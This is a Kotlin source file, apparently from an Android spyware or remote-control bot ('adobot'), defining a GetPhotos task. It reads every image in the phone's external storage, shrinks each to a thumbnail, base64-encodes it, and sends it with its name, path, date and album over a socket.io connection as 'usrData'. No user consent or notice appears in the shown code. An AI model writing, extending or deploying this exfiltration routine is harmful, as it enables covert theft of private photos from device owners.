package me.adobot.tasks

import android.content.Context
import android.provider.MediaStore
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.util.Base64
import android.util.Log
import io.socket.client.Socket
import java.io.ByteArrayOutputStream
import org.json.JSONObject
import java.util.HashMap
import android.media.ThumbnailUtils
import me.adobot.models.Image


class GetPhotos(private val ctx: Context, private val socket: Socket) : Thread() {

    companion object {
        var flag = true
    }

    private var length = 0


    private fun getImagesList(): ArrayList<Image> {

        val photoList = ArrayList<Image>()
        val cur = ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, MediaStore.Images.ImageColumns.DATE_MODIFIED)

        while (cur.moveToNext()) {
            val path = cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.DATA))
            val bucket = cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME))
            val date = cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.DATE_MODIFIED))
            val name = cur.getString(cur.getColumnIndex(MediaStore.Images.ImageColumns.DISPLAY_NAME))

            photoList.add(Image(name, path, date, bucket))
        }

        cur?.close()
        return photoList
    }

    private fun getThumb(path: String) = ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(path), 128, 128)

    private fun encodeImage(bm: Bitmap): String {

        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos)
        val b = baos.toByteArray()
        return Base64.encodeToString(b, Base64.DEFAULT)
    }

    private fun uploadThumb(name: String, date: String, bucket: String, path: String, imgData: String) {

        val data: HashMap<String, String> = HashMap()
        data["name"] = name
        data["date"] = date
        data["bucket"] = bucket
        data["path"] = path
        data["image64"] = imgData
        data["dataType"] = "images"
        data["length"] = length.toString()

        socket.emit("usrData", JSONObject(data))
    }

    override fun run() {
        super.run()

        flag = true
        val list = getImagesList()
        length = list.size
        Log.d("Suthar", list.size.toString())

        for (i in list)
            if (flag)
                uploadThumb(i.name, i.date, i.bucket_name, i.path, encodeImage(getThumb(i.path)))

        Log.d("Suthar", "All uploaded")
    }
}